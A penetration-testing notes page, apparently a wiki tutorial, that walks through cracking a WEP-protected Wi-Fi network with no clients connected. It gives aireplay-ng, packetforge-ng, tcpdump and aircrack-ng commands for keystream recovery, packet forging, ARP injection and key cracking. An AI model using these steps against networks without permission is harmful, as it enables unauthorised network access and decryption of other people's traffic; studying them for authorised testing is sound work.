---
description: >-
  This attack uses packetforge-ng to "forge" a packet that can be used to replay
  against AP collecting enough IV to crack the password.
---

# WEP Attack  \(OPEN\) - Clientless

### 1. Fake authentication attack \(MAC association\)

Similarly to scenario of WEP attack with Clients connected. Perform a Fake authentication attack to associate with AP \(refer to the 1st step of WEP attack guide link below\)

{% page-ref page="wep-attack-clients-connected.md" %}

### 2. Fragmentation attack / Korek Chop Chop

Both methods can lead us subsequently create the ARP injection packet that we can later use in replaying the request to AP \(to gather enough IV which in turn can let us crack the WEP\)

### **\(i\) Fragmentation** 

fragmentation attack does not obtain WEP key, but obtains PRGA key stream of packets - PRGA can be used to generate packets with packetforge-ng. Generate packets for injection attacks.

```bash
aireplay-ng -5 -b <AP_MAC> -h <MY_MAC> wlan0mon

# Reports "Got RELAYED packet!!"
# Saving keystream in a file name <fragment-xxxx-xxx.xor>
```

### **\(ii\) Korek Chop Chop** 

**K**orek chop chop attack can decrypt WEP packet without knowing the key. Recovery of key stream for a given packet, to allow us to decrypt previous or future packets with equal or less length of same IV. This allow us to generate our own new packets for injection without the WEP key.

We can also use korek chop chop for various things:

* decrypt interesting packets
* forge snmp packets
* blind port scan of the network
* create arp request to accelerate IV 

To perform Korek Chop chop attack use the below command. Once receive a packet enter 'y'

```bash
aireplay-ng -4 -b <AP_MAC> -h <MY_MAC> wlan0mon
# packet filename - "replay_xxx-xxxx-xxxxxx.cap"
# PRGA filename - "replay_xxx-xxxx-xxxxxx.xor"

# Examine captured packet
tcpdump -s 0 -n -e -r replay_xxx-xxx-xxxxx.cap

#TAKE NOTE OF THE IP ADDRESS
```

Now check the contents of the captured packet to discover what is the IP scheme of the network

```bash
tcpdump -s 0 -n -e -r <replay_xxx-xxxx-xxxxxx.cap>
# eg. broadcast packet details show that client ip details
```

### 3. Packetforge-ng create Injection packets

Creates encrypted packets which later be used for injection. PRGA we got previously is used to encrypt packets by packetforge-ng. 

```bash
packetforge-ng -0 -a <AP_MAC> -h <MY_MAC> -l <soure_address> -k <destination address> -y <prga file> -w <inject.cap>

# Examine if the created packet makes sense (or is a valid one)
tcpdump -n -vvv -e -s0 -r inject.cap

```

### 4. Inject Packets to network \(aireplay Interactive mode\)

Select 'y' to send packet to AP. Now the 'data' count is rapidly increasing, this attack continues in WEP attack where client is connected scenario.

```bash
aireplay-ng -2 -r <inject.cap> wlan0mon
```

### 5. Cracking WEP password

```bash
aircrack-ng -0 <airodump-writeout-file.cap>
```



